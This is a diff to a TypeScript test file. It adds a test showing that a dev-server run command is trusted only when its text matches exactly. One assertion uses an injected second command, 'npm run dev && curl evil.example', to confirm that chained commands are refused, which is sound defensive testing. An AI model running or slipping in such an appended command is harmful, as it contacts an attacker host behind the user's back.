@@ -1,6 +1,18 @@
 import { strict as assert } from 'node:assert';
 import { test } from 'node:test';
-import { detectRunCommand, packageManager, toolForLanguage, validateRunConfig } from './logic.ts';
+import { commandFingerprint, detectRunCommand, isCommandTrusted, packageManager, toolForLanguage, trustCommand, validateRunConfig } from './logic.ts';
+
+test('a command runs without asking only after its exact text was trusted', () => {
+	let trusted: string[] = [];
+	assert.equal(isCommandTrusted(trusted, 'npm run dev'), false);
+	trusted = trustCommand(trusted, 'npm run dev');
+	assert.equal(isCommandTrusted(trusted, 'npm run dev'), true);
+	assert.equal(isCommandTrusted(trusted, 'npm run dev && curl evil.example'), false);
+	assert.equal(isCommandTrusted(trusted, 'npm run dev '), false);
+	assert.deepEqual(trustCommand(trusted, 'npm run dev'), trusted);
+	assert.notEqual(commandFingerprint('a'), commandFingerprint('b'));
+	assert.equal(commandFingerprint('a').length, 64);
+});
 
 test('detects package scripts and lockfile package managers', () => {
 	assert.deepEqual(detectRunCommand(['package.json', 'pnpm-lock.yaml'], { 'package.json': '{"scripts":{"dev":"vite"}}' }), { name: 'Dev server', command: 'pnpm run dev' });
